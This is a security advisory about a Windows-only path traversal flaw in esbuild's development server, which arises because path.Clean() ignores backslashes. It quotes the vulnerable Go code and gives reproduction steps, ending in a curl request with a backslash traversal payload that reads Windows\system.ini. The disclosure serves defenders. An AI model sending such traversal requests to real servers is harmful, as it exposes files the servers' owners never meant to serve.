summary: "esbuild allows arbitrary file read when running the development server on Windows\n\
  ### Summary\n\nThe development server contains a path traversal vulnerability on Windows when\
  \ serving files from `servedir`.\n\nDue to the use of `path.Clean()` (which only normalizes\
  \ forward-slash `/` separators) instead of a Windows-aware path normalization function, it\
  \ is possible to craft requests using backslashes (`\\`) that bypass the intended directory\
  \ containment logic. An attacker can escape the configured `servedir` root and access arbitrary\
  \ files on the filesystem.\nThis issue affects Windows environments only.\n\n### Details\n\
  \nThe request path is sanitized using:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\n\
  queryPath := path.Clean(req.URL.Path)[1:]\n```\n\n\nHowever:\n- `path.Clean()` is POSIX-style\
  \ and only understands `/` (docs: `https://pkg.go.dev/path#Clean`)\n- On Windows, `\\` is\
  \ a valid path separator\n- `path.Clean()` does not treat `\\` as a separator\n\nLater, the\
  \ server constructs the absolute path:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L221\n\
  absPath := h.fs.Join(h.servedir, queryPath)\n```\n\nIf `queryPath` contains sequences such\
  \ as:\n```\n..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\n```\n\n`path.Clean()` will not\
  \ normalize them, but the Windows filesystem will interpret `\\` as directory separators when\
  \ resolving `absPath`.\nBecause the implementation does not verify that the final resolved\
  \ path remains within `servedir`, it allows directory traversal outside the intended root\
  \ directory.\n### Vulnerable Code\n\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\n\
  \tqueryPath := path.Clean(req.URL.Path)[1:]\n\t....\n\t// Check for a file in the \"servedir\"\
  \ directory\n\tif h.servedir != \"\" && kind != fs.FileEntry {\n\t\tabsPath := h.fs.Join(h.servedir,\
  \ queryPath)\n\t\tif absDir := h.fs.Dir(absPath); absDir != absPath {\n\t\t\tif entries, err,\
  \ _ := h.fs.ReadDirectory(absDir); err == nil {\n\t\t\t\tif entry, _ := entries.Get(h.fs.Base(absPath));\
  \ entry != nil && entry.Kind(h.fs) == fs.FileEntry {\n\t....\t\t\t\t\n```\n\n\n### Steps to\
  \ reproduce\n\n```\nnpm install --save-exact --save-dev esbuild\n\necho \"console.log(1)\"\
  \ > app.js\n\n.\\node_modules\\.bin\\esbuild --version\n0.27.3\n\n.\\node_modules\\.bin\\\
  esbuild app.js --bundle --outdir=www --servedir=www --watch\n\ncurl -i --path-as-is \"http://localhost:8000/..\\\
  ..\\..\\..\\..\\..\\..\\Windows\\system.ini\"\n<content of Windows\\system.ini>\n```\n\n\n\
  ### Impact\n\n- Arbitrary file read on Windows\n- Exposure of sensitive files"
